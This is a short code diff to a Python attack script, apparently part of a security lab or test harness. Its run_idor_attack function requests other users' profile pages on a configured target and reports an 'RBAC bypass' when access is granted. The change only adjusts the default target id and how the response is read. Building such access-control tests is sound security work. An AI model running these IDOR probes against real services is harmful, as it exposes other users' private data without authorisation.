@@ -23,7 +23,7 @@ from config import TARGET_URL, USERS
 
 
 def run_idor_attack(attacker_username: str = "user1",
-                    target_user_id: int = 2,
+                    target_user_id: int = 3,
                     verbose: bool = True) -> dict:
     """
     Execute an IDOR attack.
@@ -109,8 +109,8 @@ def run_idor_attack(attacker_username: str = "user1",
     if status == 200:
         # RBAC is disabled — we can see another user's data
         success = True
-        body = profile_resp.json()
-        details = f"Access GRANTED to /profile/{target_user_id} — RBAC bypass! Response: {body}"
+        body = profile_resp.text[:200]  # use .text — profile page may return HTML, not JSON
+        details = f"Access GRANTED to /profile/{target_user_id} — RBAC bypass! Preview: {body!r}"
         if verbose:
             print(f"  🔓 {details}")
     elif status == 403:
